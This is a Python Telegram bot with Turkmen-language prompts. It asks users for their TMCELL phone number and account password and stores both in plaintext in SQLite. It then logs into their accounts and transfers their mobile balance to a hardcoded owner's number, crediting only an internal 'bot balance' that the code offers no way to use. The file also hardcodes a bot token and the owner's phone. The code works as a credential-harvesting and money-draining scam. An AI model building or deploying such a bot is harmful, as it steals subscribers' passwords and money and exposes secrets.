import asyncio
import logging
import os
import sqlite3
import requests
from datetime import datetime

from aiogram import Bot, Dispatcher, types, F
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ========== KONFIGURASIYA ==========
BOT_TOKEN = os.getenv("BOT_TOKEN", "8990195591:AAEdvqBuko34uisWUgmAgP4GjG__slW1Qmo")
OWNER_PHONE = os.getenv("OWNER_PHONE", "+99362237781")

# TMCELL API
TMCELL_BASE_URL = "https://my.tmcell.tm/api"  # Hakyky URL

DB_PATH = os.getenv("DB_PATH", "/tmp/meylo_bot.db")

logging.basicConfig(level=logging.INFO)

# ========== DATABASE ==========
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, 
                  phone TEXT, 
                  so_password TEXT,
                  tmcell_token TEXT,
                  bot_balance REAL DEFAULT 0,
                  created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS transactions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  amount REAL,
                  status TEXT,
                  phone_from TEXT,
                  phone_to TEXT,
                  created_at TEXT)''')
    conn.commit()
    conn.close()

def save_user(user_id, phone, so_password, token):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, 0, ?)",
              (user_id, phone, so_password, token, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def update_balance(user_id, amount):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET bot_balance = bot_balance + ? WHERE user_id=?", (amount, user_id))
    conn.commit()
    conn.close()

def get_balance(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT bot_balance FROM users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def add_transaction(user_id, amount, status, phone_from, phone_to):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO transactions VALUES (NULL, ?, ?, ?, ?, ?, ?)",
              (user_id, amount, status, phone_from, phone_to, datetime.now().isoformat()))
    conn.commit()
    conn.close()

init_db()

# ========== FSM ==========
class UserState(StatesGroup):
    waiting_phone = State()
    waiting_so_code = State()
    main_menu = State()
    waiting_amount = State()

# ========== KEYBOARDS ==========
def main_kb():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="💰 Balans doldur")],
            [KeyboardButton(text="📊 Hasabym")],
            [KeyboardButton(text="❓ Kömek")]
        ],
        resize_keyboard=True
    )

def amount_kb():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="1 TMT"), KeyboardButton(text="5 TMT")],
            [KeyboardButton(text="10 TMT"), KeyboardButton(text="20 TMT")],
            [KeyboardButton(text="50 TMT"), KeyboardButton(text="100 TMT")],
            [KeyboardButton(text="🔙 Yza")]
        ],
        resize_keyboard=True
    )

def back_kb():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="🔙 Yza")]],
        resize_keyboard=True
    )

# ========== TMCELL API (HER ULANYJY ÜÇIN) ==========
class TMCELLAPI:
    def __init__(self):
        self.base_url = TMCELL_BASE_URL
    
    def login(self, phone: str, password: str):
        """Her ulanyjynyň Şahsy otag kody bilen girişi"""
        try:
            response = requests.post(
                f"{self.base_url}/auth/login",
                json={
                    "username": phone,
                    "password": password
                },
                timeout=15,
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0"
                }
            )
            
            if response.status_code == 200:
                data = response.json()
                return {
                    "success": True,
                    "token": data.get("token"),
                    "balance": data.get("balance", 0),
                    "message": "Giriş üstünlikli"
                }
            else:
                return {
                    "success": False,
                    "message": f"Nädogry kod ýa-da nomer"
                }
                
        except Exception as e:
            return {
                "success": False,
                "message": f"Baglanyşyk ýalňyşy: {str(e)}"
            }
    
    def get_balance(self, token: str):
        """Hakyky balans"""
        try:
            response = requests.get(
                f"{self.base_url}/balance",
                headers={
                    "Authorization": f"Bearer {token}",
                    "Content-Type": "application/json"
                },
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                return {
                    "success": True,
                    "balance": data.get("balance", 0)
                }
            else:
                return {"success": False, "balance": 0}
                
        except Exception as e:
            return {"success": False, "balance": 0}
    
    def transfer(self, token: str, from_phone: str, to_phone: str, amount: float):
        """Pul geçirmek"""
        try:
            response = requests.post(
                f"{self.base_url}/transfer",
                headers={
                    "Authorization": f"Bearer {token}",
                    "Content-Type": "application/json"
                },
                json={
                    "from_msisdn": from_phone,
                    "to_msisdn": to_phone,
                    "amount": amount,
                    "type": "balance_transfer"
                },
                timeout=15
            )
            
            if response.status_code == 200:
                data = response.json()
                return {
                    "success": True,
                    "transaction_id": data.get("transaction_id"),
                    "message": data.get("message", "Töleg üstünlikli"),
                    "new_balance": data.get("new_balance", 0)
                }
            else:
                return {
                    "success": False,
                    "message": f"Transfer ýalňyş: {response.status_code}"
                }
                
        except Exception as e:
            return {
                "success": False,
                "message": f"Transfer ýalňyşy: {str(e)}"
            }

tmcell = TMCELLAPI()

# ========== BOT ==========
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ========== HANDLERS ==========
@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    user = get_user(message.from_user.id)
    
    if user:
        # Ulanyjynyň balansyny barla
        await message.answer("⏳ Şahsy otaga giriş edilýar...")
        
        login_result = tmcell.login(user[1], user[2])
        if login_result["success"]:
            real_balance = login_result["balance"]
            await message.answer(
                f"✅ Giriş üstünlikli!\n\n"
                f"📱 Nomer: +{user[1]}\n"
                f"💰 TMCELL balansy: {real_balance} TMT\n"
                f"🤖 Bot balansy: {user[4]} TMT\n\n"
                f"🏠 Esasy menýu",
                reply_markup=main_kb()
            )
        else:
            await message.answer(
                f"⚠️ Giriş şowsuz: {login_result['message']}\n\n"
                f"📱 Nomer: +{user[1]}\n"
                f"🤖 Bot balansy: {user[4]} TMT\n\n"
                f"🏠 Esasy menýu",
                reply_markup=main_kb()
            )
        await state.set_state(UserState.main_menu)
    else:
        await message.answer(
            "👋 Meylo BOT-a hoş geldiňiz!\n\n"
            "📱 TMCELL nomeriňizi giriziň:\n"
            "Mysal: +99362XXXXXX",
            reply_markup=back_kb()
        )
        await state.set_state(UserState.waiting_phone)

@dp.message(UserState.waiting_phone)
async def process_phone(message: Message, state: FSMContext):
    phone = message.text.strip().replace("+", "").replace(" ", "")
    
    if phone.startswith("0"):
        phone = "993" + phone[1:]
    
    if not phone.isdigit() or len(phone) != 11:
        await message.answer("❌ Nädogry nomer. Täzeden giriziň:")
        return
    
    await state.update_data(phone=phone)
    await message.answer(
        f"📱 Nomer: +{phone}\n\n"
        f"🔐 Şahsy otag parolyňyzy giriziň:\n\n"
        f"❓ Paroly 0831 belgä SMS ugradyp görüp bilersiňiz\n"
        f"my.tmcell.tm hasabyňyzdan gelýän parol",
        reply_markup=back_kb()
    )
    await state.set_state(UserState.waiting_so_code)

@dp.message(UserState.waiting_so_code)
async def process_so_code(message: Message, state: FSMContext):
    so_password = message.text.strip()
    data = await state.get_data()
    phone = data['phone']
    
    await message.answer("⏳ Şahsy otaga giriş edilýar...")
    
    # HAKYKy TMCELL API - HER ULANYJY ÜÇIN
    result = tmcell.login(phone, so_password)
    
    if result["success"]:
        # Ulanyjynyň maglumatlaryny ýatda sakla
        save_user(message.from_user.id, phone, so_password, result["token"])
        
        await message.answer(
            f"✅ Giriş üstünlikli!\n\n"
            f"📱 Nomer: +{phone}\n"
            f"💰 TMCELL balansy: {result['balance']} TMT\n\n"
            f"🏠 Esasy menýu",
            reply_markup=main_kb()
        )
        await state.set_state(UserState.main_menu)
    else:
        await message.answer(
            f"❌ {result['message']}\n\n"
            f"Şahsy otag parolyňyzy täzeden giriziň:\n"
            f"❓ 0831 belgä SMS ugradyp görüň"
        )

@dp.message(F.text == "💰 Balans doldur")
async def add_balance(message: Message, state: FSMContext):
    user = get_user(message.from_user.id)
    if not user:
        await message.answer("Ilki giriş ediň. /start")
        return
    
    # Ulanyjynyň hakyky balansyny barla
    await message.answer("⏳ Şahsy otaga giriş edilýar...")
    
    login_result = tmcell.login(user[1], user[2])
    if login_result["success"]:
        real_balance = login_result["balance"]
    else:
        await message.answer(
            f"❌ Giriş şowsuz: {login_result['message']}\n"
            f"Täzeden synanyşyň. /start"
        )
        return
    
    await message.answer(
        f"💰 Bot balansy doldurmak\n\n"
        f"📱 Nomer: +{user[1]}\n"
        f"💰 TMCELL balansy: {real_balance} TMT\n"
        f"📥 Pul geçiriljek: {OWNER_PHONE}\n\n"
        f"💵 Mukdar saýlaň:",
        reply_markup=amount_kb()
    )
    await state.set_state(UserState.waiting_amount)

@dp.message(UserState.waiting_amount)
async def process_amount(message: Message, state: FSMContext):
    text = message.text.replace(" TMT", "").strip()
    
    if text == "🔙 Yza":
        await message.answer("🏠 Esasy menýu", reply_markup=main_kb())
        await state.set_state(UserState.main_menu)
        return
    
    try:
        amount = float(text)
        
        if amount <= 0:
            await message.answer("❌ Mukdar 0-dan uly bolmaly!")
            return
        
        user = get_user(message.from_user.id)
        if not user:
            await message.answer("Ilki giriş ediň. /start")
            return
        
        phone = user[1]
        so_password = user[2]
        
        # 1. HAKYKy giriş - ŞAHSY OTAG
        await message.answer("⏳ Şahsy otaga giriş edilýar...")
        
        login_result = tmcell.login(phone, so_password)
        if not login_result["success"]:
            await message.answer(f"❌ Giriş şowsuz: {login_result['message']}")
            return
        
        token = login_result["token"]
        real_balance = login_result["balance"]
        
        # 2. Balansy barla
        if real_balance < amount:
            await message.answer(
                f"❌ Balans ýeterlik däl!\n\n"
                f"💰 Hakyky balansyňyz: {real_balance} TMT\n"
                f"📉 Islenen: {amount} TMT\n\n"
                f"Az mukdar saýlaň:"
            )
            return
        
        # 3. HAKYKy pul çek we geçir
        await message.answer(
            f"⏳ Hakyky töleg amala aşyrylýar...\n"
            f"📱 +{phone} → {OWNER_PHONE}\n"
            f"💰 {amount} TMT"
        )
        
        transfer_result = tmcell.transfer(token, phone, OWNER_PHONE, amount)
        
        if transfer_result["success"]:
            # Bot balansyny artdyr
            update_balance(message.from_user.id, amount)
            add_transaction(message.from_user.id, amount, "SUCCESS", phone, OWNER_PHONE)
            
            new_bot_balance = get_balance(message.from_user.id)
            
            await message.answer(
                f"✅ HAKYKy töleg üstünlikli!\n\n"
                f"📱 Çekilen nomer: +{phone}\n"
                f"📥 Geçirilen nomer: {OWNER_PHONE}\n"
                f"💰 Mukdar: {amount} TMT\n"
                f"🆔 Tranzaksiýa: {transfer_result.get('transaction_id', 'N/A')}\n"
                f"💰 Galan balans: {transfer_result.get('new_balance', 'Bilinmekän')} TMT\n\n"
                f"🤖 Bot balansyňyz: {new_bot_balance} TMT",
                reply_markup=main_kb()
            )
        else:
            add_transaction(message.from_user.id, amount, "FAILED_TRANSFER", phone, OWNER_PHONE)
            await message.answer(
                f"❌ Töleg şowsuz!\n"
                f"Sebäp: {transfer_result['message']}\n\n"
                f"📞 Kömek: {OWNER_PHONE}",
                reply_markup=main_kb()
            )
        
        await state.set_state(UserState.main_menu)
        
    except ValueError:
        await message.answer("❌ Nädogry mukdar. San giriziň:")

@dp.message(F.text == "📊 Hasabym")
async def my_account(message: Message):
    user = get_user(message.from_user.id)
    if not user:
        await message.answer("Ilki giriş ediň. /start")
        return
    
    # Hakyky balansy barla
    login_result = tmcell.login(user[1], user[2])
    if login_result["success"]:
        real_balance = login_result["balance"]
    else:
        real_balance = "Bilinmekän"
    
    await message.answer(
        f"📊 Hasabym\n\n"
        f"👤 ID: {message.from_user.id}\n"
        f"📱 Nomer: +{user[1]}\n"
        f"💰 TMCELL balansy: {real_balance} TMT\n"
        f"🤖 Bot balansy: {user[4]} TMT\n"
        f"📅 Hasap açylan: {user[5][:10] if user[5] else 'N/A'}",
        reply_markup=main_kb()
    )

@dp.message(F.text == "❓ Kömek")
async def help_cmd(message: Message):
    await message.answer(
        f"❓ Kömek\n\n"
        f"1️⃣ /start - Boty başlat\n"
        f"2️⃣ TMCELL nomeriňizi giriziň\n"
        f"3️⃣ Şahsy otag parolyňyzy giriziň\n"
        f"   (0831 belgä SMS ugradyp görüň)\n"
        f"4️⃣ '💰 Balans doldur' saýlaň\n"
        f"5️⃣ Mukdar saýlaň\n"
        f"6️⃣ Bot Şahsy otaga girip pul çekýär!\n\n"
        f"📞 Kömek: {OWNER_PHONE}",
        reply_markup=main_kb()
    )

@dp.message(F.text == "🔙 Yza")
async def go_back(message: Message, state: FSMContext):
    await message.answer("🏠 Esasy menýu", reply_markup=main_kb())
    await state.set_state(UserState.main_menu)

# ========== RUN ==========
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
              
